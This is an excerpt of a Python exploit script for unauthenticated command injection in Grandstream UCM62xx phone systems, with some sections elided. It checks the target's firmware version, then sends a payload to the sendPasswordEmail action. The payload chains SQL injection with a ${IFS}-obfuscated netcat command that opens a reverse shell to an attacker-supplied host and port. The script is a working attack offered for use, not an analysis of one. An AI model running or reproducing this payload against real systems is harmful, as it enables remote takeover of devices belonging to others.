##
# Exploit Title: UCM62xx Unauthenticated Command Injection
# Date: 03/23/2020
...
top_parser.add_argument('--lhost', action="store", dest="lhost", required=True, help="The local host to connect back to")
top_parser.add_argument('--lport', action="store", dest="lport", type=int, help="The local port to connect back to", default=1270)
...
match = re.match('^([0-9]+)\.([0-9]+)\.([0-9]+)\.([0-9]+)$', parsed_response['response']['prog_version'])
if not match:
...
if (major > 1) or (major == 1 and minor > 0) or (major == 1 and minor == 0 and point > 19) or (major == 1 and minor == 0 and point == 19 and patch >= 20):
    print('[-] Unaffected version')
    sys.exit(1)
else:
    print('[+] Vulnerable version!')

print('[+] Sending exploit. Reverse shell to %s:%i' % (args.lhost, args.lport))
try:
    exploit = 'admin\' or 1=1--`;`nc${IFS}' + args.lhost + '${IFS}' + str(args.lport) + '${IFS}-e${IFS}/bin/sh`;`'
    resp = requests.post(url=url, data='action=sendPasswordEmail&user_name=' + exploit, verify=False)
